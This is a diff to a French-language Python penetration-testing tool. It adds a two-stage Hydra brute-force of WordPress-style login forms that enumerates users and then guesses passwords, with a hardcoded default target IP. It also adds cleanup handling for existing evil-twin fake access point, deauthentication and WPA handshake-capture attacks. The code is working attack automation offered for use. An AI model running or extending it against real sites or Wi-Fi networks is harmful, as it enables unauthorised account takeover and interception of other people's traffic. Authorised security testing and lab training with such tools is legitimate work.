@@ -10,6 +10,8 @@ import re
 import csv
 import os
 import sys
+import signal
+import atexit
 from pathlib import Path
 from typing import List, Dict, Optional, Tuple
 import pyperclip
@@ -40,6 +42,116 @@ custom_theme = Theme({
 })
 
 console = Console(theme=custom_theme)
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# GESTIONNAIRE DE NETTOYAGE GLOBAL
+# ═══════════════════════════════════════════════════════════════════════════
+
+class CleanupManager:
+    """Gère le nettoyage propre à la sortie du programme"""
+    
+    def __init__(self):
+        self.monitor_interfaces = []  # Interfaces en mode monitor à nettoyer
+        self.child_processes = []      # Sous-processus à tuer
+        self.temp_files = []           # Fichiers temporaires à supprimer
+        self.cleanup_hooks = []        # Fonctions de nettoyage custom
+        
+    def register_monitor_interface(self, iface: str):
+        """Enregistre une interface en mode monitor"""
+        if iface and iface not in self.monitor_interfaces:
+            self.monitor_interfaces.append(iface)
+    
+    def register_process(self, proc):
+        """Enregistre un sous-processus à tuer"""
+        if proc and proc not in self.child_processes:
+            self.child_processes.append(proc)
+    
+    def register_temp_file(self, filepath: str):
+        """Enregistre un fichier temporaire"""
+        if filepath and filepath not in self.temp_files:
+            self.temp_files.append(filepath)
+    
+    def register_hook(self, func):
+        """Enregistre une fonction de nettoyage personnalisée"""
+        if func and func not in self.cleanup_hooks:
+            self.cleanup_hooks.append(func)
+    
+    def cleanup(self):
+        """Effectue le nettoyage complet"""
+        # 1. Tuer les sous-processus
+        for proc in self.child_processes:
+            try:
+                if proc.poll() is None:  # Si encore en vie
+                    proc.terminate()
+                    proc.wait(timeout=2)
+            except Exception:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+        
+        # 2. Tuer les processus connus par nom
+        for proc_name in ['airodump-ng', 'aireplay-ng', 'hostapd', 'dnsmasq']:
+            try:
+                subprocess.run(['sudo', 'pkill', '-9', '-f', proc_name],
+                              capture_output=True, timeout=2)
+            except Exception:
+                pass
+        
+        # 3. Restaurer les interfaces monitor
+        for iface in self.monitor_interfaces:
+            try:
+                # Arrêter airmon-ng
+                subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
+                              capture_output=True, timeout=3)
+            except Exception:
+                pass
+        
+        # 4. Redémarrer NetworkManager
+        if self.monitor_interfaces:
+            try:
+                subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
+                              capture_output=True, timeout=5)
+            except Exception:
+                pass
+        
+        # 5. Supprimer les fichiers temporaires
+        for filepath in self.temp_files:
+            try:
+                if os.path.exists(filepath):
+                    os.remove(filepath)
+            except Exception:
+                pass
+        
+        # 6. Exécuter les hooks custom
+        for hook in self.cleanup_hooks:
+            try:
+                hook()
+            except Exception:
+                pass
+
+# Instance globale du gestionnaire
+cleanup_manager = CleanupManager()
+
+
+def signal_handler(signum, frame):
+    """Handler pour SIGINT (Ctrl+C) et SIGTERM"""
+    console.print("\n[warning]⚠ Signal reçu, nettoyage en cours...[/warning]")
+    cleanup_manager.cleanup()
+    console.print("[success]✓ Nettoyage terminé[/success]")
+    sys.exit(0)
+
+
+def atexit_handler():
+    """Handler appelé automatiquement à la sortie"""
+    cleanup_manager.cleanup()
+
+
+# Enregistrer les handlers
+signal.signal(signal.SIGINT, signal_handler)   # Ctrl+C
+signal.signal(signal.SIGTERM, signal_handler)  # kill
+atexit.register(atexit_handler)                # Exit normal
 
 
 # ASCII Art du crâne - PARTIE 1 (pour interfaces)
@@ -1587,6 +1699,7 @@ class PentestTool:
             menu.add_row("B", "📡 Fake AP (Evil Twin)")
             menu.add_row("C", "🤝 Capture Handshake WPA")
             menu.add_row("D", "📁 Gobuster (scan web)")
+            menu.add_row("E", "🔐 Hydra (bruteforce login)")
             menu.add_row("0", "❌ Quitter")
             
             # Partie 2 du crâne
@@ -1623,6 +1736,8 @@ class PentestTool:
                 self._handshake_menu()
             elif choice in ("D", "d"):
                 self._gobuster_menu()
+            elif choice in ("E", "e"):
+                self._hydra_menu()
             elif choice == "0":
                 console.print("[success]Au revoir! 👋[/success]")
                 break
@@ -2176,7 +2291,12 @@ class PentestTool:
             for c in [selected_iface + "mon", "mon0", "mon1"]:
                 if subprocess.run(["ip", "link", "show", c], capture_output=True).returncode == 0:
                     mon = c; break
-        return mon or (selected_iface + "mon")
+        mon_iface = mon or (selected_iface + "mon")
+        
+        # Enregistrer pour nettoyage automatique
+        cleanup_manager.register_monitor_interface(mon_iface)
+        
+        return mon_iface
 
     def _deauth_monitor(self, selected_iface: str):
         """Deauth mode monitor — scan iw/airodump puis envoi trames"""
@@ -2198,6 +2318,7 @@ class PentestTool:
                  "-w", f"{tmpdir}/scan", mon_iface],
                 stdout=devnull, stderr=devnull,
                 stdin=subprocess.DEVNULL, close_fds=True)
+            cleanup_manager.register_process(p)  # Enregistrer pour cleanup
             time.sleep(scan_dur)
             subprocess.run(["sudo", "pkill", "-9", "-f", "airodump-ng"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -2720,6 +2841,7 @@ class PentestTool:
                  '-w', scan_prefix, mon_iface],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
+            cleanup_manager.register_process(p_scan)
             time.sleep(10)
             p_scan.terminate()
             time.sleep(0.5)
@@ -2792,6 +2914,7 @@ class PentestTool:
                  mon_iface],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
+            cleanup_manager.register_process(p_cap)
             time.sleep(3)
 
             # 4. Deauth pour forcer handshake
@@ -3173,6 +3296,194 @@ class PentestTool:
 
         Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
 
+    def _hydra_menu(self):
+        """Bruteforce HTTP login avec Hydra (2 étapes : users puis passwords)"""
+        console.print("\n[title]═══ HYDRA — BRUTEFORCE LOGIN ═══[/title]")
+        console.print("[info]🔐 Bruteforce HTTP POST form (WordPress, etc.)[/info]\n")
+
+        # Vérifier hydra
+        if subprocess.run(['which', 'hydra'], capture_output=True).returncode != 0:
+            console.print("[error]Hydra n'est pas installé[/error]")
+            console.print("[dim]sudo apt install hydra[/dim]")
+            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+            return
+
+        # ── ÉTAPE 1 : ÉNUMÉRATION DES USERS ───────────────────────────────────
+        console.print("[orange1]═══ ÉTAPE 1 : ÉNUMÉRATION USERS ═══[/orange1]\n")
+
+        # Target
+        target = Prompt.ask("[orange1]Cible (IP ou domaine)[/orange1]",
+                           default="163.172.228.173")
+
+        # Wordlist users
+        import os, glob
+        current_dir = os.getcwd()
+        wordlists = glob.glob(os.path.join(current_dir, '*.txt'))
+        wordlists += glob.glob(os.path.join(current_dir, '*.dic'))
+
+        console.print(f"\n[orange1]Wordlist USERS dans {current_dir}:[/orange1]")
+        if wordlists:
+            for idx, wl in enumerate(wordlists, 1):
+                console.print(f"  {idx}. {os.path.basename(wl)}")
+            console.print("  0. Chemin personnalisé")
+            wl_choice = Prompt.ask("Wordlist users", default="1")
+            try:
+                if wl_choice == "0":
+                    user_wordlist = Prompt.ask("[orange1]Chemin wordlist users[/orange1]")
+                else:
+                    user_wordlist = wordlists[int(wl_choice) - 1]
+            except (ValueError, IndexError):
+                user_wordlist = wordlists[0] if wordlists else None
+        else:
+            user_wordlist = Prompt.ask("[orange1]Chemin wordlist users[/orange1]")
+
+        if not user_wordlist or not os.path.exists(user_wordlist):
+            console.print(f"[error]Wordlist introuvable: {user_wordlist}[/error]")
+            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+            return
+
+        # Form parameters
+        console.print("\n[orange1]Paramètres du formulaire:[/orange1]")
+        form_path = Prompt.ask("[orange1]Chemin formulaire[/orange1]",
+                               default="/wp-login.php")
+        form_data = Prompt.ask("[orange1]Données POST[/orange1]",
+                               default="log=^USER^&pwd=^PASS^&wp-submit=Log+In")
+        fail_string = Prompt.ask("[orange1]Chaîne d'échec (dans la réponse)[/orange1]",
+                                 default="Invalid username")
+
+        # Mot de passe dummy pour l'énumération users
+        dummy_pass = Prompt.ask("[orange1]Mot de passe dummy[/orange1]",
+                               default="something")
+
+        # Construction commande étape 1
+        cmd1 = [
+            'hydra',
+            '-L', user_wordlist,
+            '-p', dummy_pass,
+            target,
+            'http-post-form',
+            f'{form_path}:{form_data}:F={fail_string}',
+            '-vv'
+        ]
+
+        console.print(f"\n[info]🚀 Commande: {' '.join(cmd1)}[/info]")
+        console.print("[warning]Ctrl+C pour arrêter[/warning]\n")
+
+        # Exécution étape 1
+        valid_users = []
+        try:
+            result = subprocess.run(cmd1, capture_output=True, text=True)
+            # Parser la sortie pour extraire les users valides
+            for line in result.stdout.split('\n'):
+                # Hydra format: [80][http-post-form] host: 163.172.228.173   login: elliot   password: something
+                if '[http-post-form]' in line and 'login:' in line:
+                    parts = line.split('login:')
+                    if len(parts) > 1:
+                        user = parts[1].split()[0].strip()
+                        if user not in valid_users:
+                            valid_users.append(user)
+            
+            # Aussi chercher dans stderr
+            for line in result.stderr.split('\n'):
+                if '[http-post-form]' in line and 'login:' in line:
+                    parts = line.split('login:')
+                    if len(parts) > 1:
+                        user = parts[1].split()[0].strip()
+                        if user not in valid_users:
+                            valid_users.append(user)
+
+            if not valid_users:
+                console.print("\n[warning]⚠ Aucun user valide trouvé[/warning]")
+                console.print("[dim]La sortie brute:[/dim]")
+                console.print(result.stdout[:500])
+                Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+                return
+
+            console.print(f"\n[success]✓ {len(valid_users)} user(s) valide(s) trouvé(s)[/success]")
+
+        except KeyboardInterrupt:
+            console.print("\n[warning]⚠ Scan interrompu[/warning]")
+            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+            return
+        except Exception as e:
+            console.print(f"\n[error]Erreur: {e}[/error]")
+            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+            return
+
+        # ── ÉTAPE 2 : BRUTEFORCE PASSWORDS ────────────────────────────────────
+        console.print("\n[orange1]═══ ÉTAPE 2 : BRUTEFORCE PASSWORDS ═══[/orange1]\n")
+
+        # Afficher les users trouvés
+        console.print("[orange1]Users valides:[/orange1]")
+        for idx, user in enumerate(valid_users, 1):
+            console.print(f"  {idx}. [white]{user}[/white]")
+        console.print("  0. Tous les users")
+
+        # Sélection user
+        try:
+            user_idx = int(Prompt.ask("[orange1]User cible[/orange1]", default="1"))
+            if user_idx == 0:
+                target_users = valid_users
+            else:
+                target_users = [valid_users[user_idx - 1]]
+        except (ValueError, IndexError):
+            target_users = [valid_users[0]]
+
+        # Wordlist passwords
+        console.print(f"\n[orange1]Wordlist PASSWORDS dans {current_dir}:[/orange1]")
+        if wordlists:
+            for idx, wl in enumerate(wordlists, 1):
+                console.print(f"  {idx}. {os.path.basename(wl)}")
+            console.print("  0. Chemin personnalisé")
+            wl_choice = Prompt.ask("Wordlist passwords", default="1")
+            try:
+                if wl_choice == "0":
+                    pass_wordlist = Prompt.ask("[orange1]Chemin wordlist passwords[/orange1]")
+                else:
+                    pass_wordlist = wordlists[int(wl_choice) - 1]
+            except (ValueError, IndexError):
+                pass_wordlist = wordlists[0] if wordlists else None
+        else:
+            pass_wordlist = Prompt.ask("[orange1]Chemin wordlist passwords[/orange1]")
+
+        if not pass_wordlist or not os.path.exists(pass_wordlist):
+            console.print(f"[error]Wordlist introuvable: {pass_wordlist}[/error]")
+            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+            return
+
+        # Nouvelle chaîne d'échec pour les passwords
+        fail_string2 = Prompt.ask("[orange1]Chaîne d'échec password (dans la réponse)[/orange1]",
+                                  default="is incorrect")
+
+        # Construction commande étape 2
+        for user in target_users:
+            console.print(f"\n[info]🔥 Bruteforce user: [bold]{user}[/bold][/info]")
+            cmd2 = [
+                'hydra',
+                '-l', user,
+                '-P', pass_wordlist,
+                target,
+                'http-post-form',
+                f'{form_path}:{form_data}:F={fail_string2}',
+                '-vv'
+            ]
+
+            console.print(f"[dim]Commande: {' '.join(cmd2)}[/dim]\n")
+
+            try:
+                result = subprocess.run(cmd2, text=True)
+                if result.returncode == 0:
+                    console.print(f"\n[success]✓ Bruteforce terminé pour {user}[/success]")
+                else:
+                    console.print(f"\n[warning]⚠ Terminé avec code {result.returncode} pour {user}[/warning]")
+            except KeyboardInterrupt:
+                console.print(f"\n[warning]⚠ Bruteforce {user} interrompu[/warning]")
+                break
+            except Exception as e:
+                console.print(f"\n[error]Erreur {user}: {e}[/error]")
+
+        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
+
     def _fake_ap_menu(self):
         """Crée un Fake AP (Evil Twin) avec hostapd + dnsmasq"""
         console.print("\n[title]═══ FAKE AP — EVIL TWIN ═══[/title]")
@@ -3345,6 +3656,7 @@ button{width:100%;padding:12px;background:#0070c9;color:white;border:none;border
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT
             )
             procs.append(p_hostapd)
+            cleanup_manager.register_process(p_hostapd)
             time.sleep(2)
 
             # 3. dnsmasq
@@ -3354,6 +3666,7 @@ button{width:100%;padding:12px;background:#0070c9;color:white;border:none;border
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT
             )
             procs.append(p_dnsmasq)
+            cleanup_manager.register_process(p_dnsmasq)
             time.sleep(1)
 
             # 4. Mode capture
